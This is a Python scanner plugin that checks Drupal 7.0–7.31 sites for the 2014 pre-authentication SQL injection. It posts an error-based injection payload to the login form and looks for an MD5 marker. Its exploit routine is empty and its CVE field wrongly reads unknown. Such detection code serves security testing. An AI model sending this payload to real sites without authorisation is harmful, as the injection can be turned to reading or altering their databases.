# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    poc_id = '8d487090-6ac4-4a31-ac1b-a4242b793d71'
    name = 'Drupal 7.0-7.31 node SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-15'  # 漏洞公布时间
    desc = '''
        /?q=node&destination=node 由于后台操作对用户验证逻辑不严谨，导致后台操作可对未登录者开放。
    ''' # 漏洞描述
    ref = 'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Drupal'  # 漏洞应用名称
    product_version = '7.0-7.31'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9885dbcc-7154-4d83-b58b-481e2cf1dc0b'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            verify_url = '{target}'.format(target=self.target)+ '/?q=node&destination=node'
            payload = 'name[0%20and (select 1 from  (select count(*),concat((select md5(133233))' \
                   ',floor(rand(0)*2))x from  information_schema.ta' \
                   'bles group by x)a);#]=test3&name[0]=test2&pass=test&form_id=user_lo' \
                   'gin_block'
            response = urllib2.urlopen(urllib2.Request(verify_url, data=payload)).read()
            if '573da9cd9cf588e67327d2be25eae2cd' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()
